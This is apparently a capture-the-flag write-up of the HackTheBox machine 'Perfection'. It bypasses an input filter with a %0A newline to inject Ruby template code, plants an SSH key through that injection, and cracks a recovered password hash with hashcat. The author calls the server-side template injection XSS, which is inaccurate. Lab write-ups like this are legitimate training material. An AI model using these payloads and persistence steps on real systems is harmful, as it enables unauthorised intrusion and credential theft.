---
date: 2025-02-16
categories: [CTF, HTB]
title: "HTB - Perfection"
tags: ['hashcat', 'nmap', 'privilege escalation', 'python', 'rce', 'xss']

description: "Perfection - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Perfection

NMAP

![image1](../resources/6ce18aca78e24775aa1bf582dbea55f5.png)

- On port 80 we get:

![image2](../resources/15189e31d7634540ad15fe4e28cd3ee2.png)

- After trying multiple characters, everything seems to be blocked by an XSS filter


![image3](../resources/9c2f6c871019421b867d497bd70f0b10.png)


![image4](../resources/a6a051d0f4b0472883d9c24f76c03a37.png)

- But then I found the newline character **%0A**

![image5](../resources/b00bdeb602d0400d9630829a7730c405.png)

- Open the request in Burp

- Enter a value for category1 and add the **%0A** and then a 'malicious character'
And now it doesn't seem to block it

- Since this is using Ruby we need to construct Ruby code that gets executed within the \<script\> tags:
```javascript
<script>document.write("<p>Server Hostname: <%= `hostname` %></p>");</script>
```

Now URL encode it:

```js
document.write%28%22%3Cp%3EServer%20Hostname%3A%20%3C%25%3D%20%60ls%60%20%25%3E%3C%2Fp%3E%22%29%3B
```

The parameter category1 value will be:
```javascript
one%0A<script>document.write%28%22%3Cp%3EServer%20Hostname%3A%20%3C%25%3D%20%60hostname%60%20%25%3E%3C%2Fp%3E%22%29%3B</script>
```
You must have the **%0A** there


![image6](../resources/4efd277667134a488b10ac067cb598bf.png)

- And we get the hostname back
- XSS is successful

- If we query **id** - we can see that we are user susan

![image7](../resources/d5ed4ab09d284080aa0e4ab09469ff4b.png)

And that she has sudo rights as well


![image8](../resources/924483b9630e4edb8be055c4e6ba8106.png)

- After doing some enumeration on susan's home folder -we get a file with credentials
**/home/susan/Migration/pupilpath_credentials.db**


![image9](../resources/47f58567e5b3413ab0903c70f010def1.png)


![image10](../resources/d50ab97750a8408e837ab868cfb932c2.png)

- We can connect to the box by:
Create a SSH key pair

```bash
chmod 600 id_rsa

```
**<u>In Burp:</u>**

```bash
mkdir /home/susan/.ssh

touch /home/susan/.ssh/authorized_keys

echo "<id_rsa.pub>" > /home/susan/.ssh/authorized_keys

```

```bash
ssh susan@10.129.208.176 -i id_rsa
```
![image11](../resources/e388b7ede795481dabe510f0d22f2fa6.png)

- We find a credentials file and the type of SQL db used:

![image12](../resources/27c7c0a4016f43abb435df233a7c3c2f.png)


![image13](../resources/991240b7c69c47a0a216e211019b7d0a.png)

- This couldn't be cracked using rockyou.txt

- Further enumeration revealed the file:
**/var/mail/susan**


![image14](../resources/2880f75162a843f4a3d72a66b89c3d15.png)

- Create a python script to generate a wordlist
I didn't do the whole range in one go, as the file would have been enormous:


![image15](../resources/ffea34060fa147fa8bb83c1e24f46235.png)


![image16](../resources/e430581d76bb427c9a87ab67cb99378d.png)

- After every generated list I tried it with hashcat:
```bash
hashcat -m 1400 -a 0 hash list

```

![image17](../resources/6c426031790b43fda2a98789fcd6066a.png)

**susan_nasus_413759210**

- And as susan has sudo rights:

![image18](../resources/2ef192ae37bf431f9d2aa08c69c6c5d8.png)